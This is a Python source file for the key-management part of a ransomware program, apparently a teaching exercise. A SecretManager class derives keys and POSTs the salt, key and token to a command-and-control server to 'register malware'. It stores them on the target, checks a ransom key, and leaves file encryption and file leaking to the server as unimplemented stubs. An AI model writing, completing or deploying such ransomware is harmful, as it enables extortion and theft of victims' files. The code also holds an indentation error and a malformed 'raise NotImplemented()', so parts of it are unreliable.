from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Derive a key from a salt and key using PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        return kdf.derive(key)


    def create(self)->Tuple[bytes, bytes, bytes]:
         # Generate random salt, key, and token
        salt = os.urandom(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        token = secrets.token_bytes(self.TOKEN_LENGTH)

        # Derive the final key from the salt and key using PBKDF2HMAC
        final_key = self.do_derivation(salt, key)

        return salt, final_key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        url = f"http://{self._remote_host_port}/new"
        data = {
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "token": self.bin_to_b64(token),
        }
        res = requests.post(url, json=data)
        res.raise_for_status()
        
    def setup(self)->None:
        if not os.path.exists(self._path):
            os.makedirs(self._path)
        # main function to create crypto data and register malware to cnc
        # Create crypto data and register malware to CNC
        salt, key, token = self.create()
        self.post_new(salt, key, token)

        # Save the crypto data to the target
        with open(os.path.join(self._path, "salt"), "wb") as f:
            f.write(salt)
        with open(os.path.join(self._path, "key"), "wb") as f:
            f.write(key)
        with open(os.path.join(self._path, "token"), "wb") as f:
            f.write(token)

    def load(self)->None:
        # function to load crypto data
        with open(os.path.join(self._path, "salt"), "rb") as f:
            self._salt = f.read()

        with open(os.path.join(self._path, "token"), "rb") as f:
            self._token = f.read()

        with open(os.path.join(self._path, "key"), "rb") as f:
            self._key = f.read()


    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        return self._key == self.do_derivation(self._salt, candidate_key)

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        key = base64.b64decode(b64_key)
        if not self.check_key(key):
            raise ValueError("Invalid key")

        self._key = key

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
         token_hash = sha256(self._token).hexdigest()
        return token_hash

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()